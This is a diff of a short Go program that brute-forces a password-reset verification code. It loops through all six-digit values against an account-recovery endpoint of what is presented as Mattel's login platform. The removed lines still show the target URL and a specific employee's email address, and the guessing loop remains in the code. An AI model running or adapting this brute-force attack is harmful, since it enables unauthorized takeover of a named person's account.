@@ -7,7 +7,7 @@ import (
 
 func main() {
 	//  Make HTTP GET request for website
-	response, err := http.Get("https://login.platform.mattel/account/recover/end?token=%s&email=tiffanny.hernaez%40mattel.com")
+	response, err := http.Get("")
 	if err != nil {
 		fmt.Println("HTTP GET request failed: ", err)
 	}
@@ -15,8 +15,8 @@ func main() {
 	defer response.Body.Close()
 
 	// Loop on testing the verification code
-	url1 := "https://login.platform.mattel/account/recover/end?token="
-	url2 := "&email=tiffanny.hernaez%40mattel.com"
+	url1 := ""
+	url2 := ""
 
 	for index := 1; index < 999999; index++ {
 		n := fmt.Sprintf("%06d", index)
